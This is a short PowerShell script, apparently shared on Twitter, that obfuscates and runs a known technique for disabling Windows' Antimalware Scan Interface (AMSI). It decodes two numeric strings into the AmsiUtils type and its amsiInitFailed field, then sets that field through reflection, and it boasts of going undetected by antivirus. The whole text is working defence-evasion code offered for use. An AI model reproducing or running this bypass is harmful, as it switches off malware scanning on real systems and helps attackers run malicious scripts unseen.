#Twitter: @TihanyiNorbert  (No AV detecetion 2021 December)
#Based on the original work of Matt Graeber @mattifestation script.
$A="5492868772801748688168747280728187173688878280688776"
$B="8281173680867656877679866880867644817687416876797271"
function C($n, $m){
[string]($n..$m|%{[char][int](29+($A+$B).
    substring(($_*2),2))})-replace " "}
$k=C 0 37; $r=C 38 51
$a=[Ref].Assembly.GetType($k)
$a.GetField($r,'NonPublic,Static').SetValue($null,$true)


